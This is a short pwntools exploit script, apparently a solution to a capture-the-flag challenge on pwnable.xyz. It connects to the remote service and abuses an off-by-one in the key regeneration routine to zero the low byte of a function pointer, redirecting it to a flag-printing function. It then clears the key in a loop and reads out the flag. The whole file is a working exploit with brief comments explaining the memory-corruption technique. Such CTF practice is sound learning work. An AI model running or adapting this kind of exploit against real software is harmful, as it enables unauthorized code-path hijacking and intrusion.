from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30006)

def regen_key(len):
    p.sendlineafter('> ', '1')
    p.sendlineafter(': ', str(len))

def load_flag():
    p.sendlineafter('> ', '2')

def print_flag(option):
    p.sendlineafter('> ', '3')
    p.sendafter('instead? ', option)
    if option == 'y':
        p.sendafter(': ', 'a')

print_flag('y')

regen_key(0x40) # use off-by-one to make lowest byte of f_do_comment become '\x00' and it is the offset of real_print_flag

# regenerate key will make the len+1 byte become '\x00' so regenerate key len from 0x3f to 1 make key become all '\x00' except the first byte
for i in range(0x3f, 0, -1):
    regen_key(i)
    success(f'regen ken len {i}')

load_flag()
print_flag('n')
print(p.recvuntil('}'))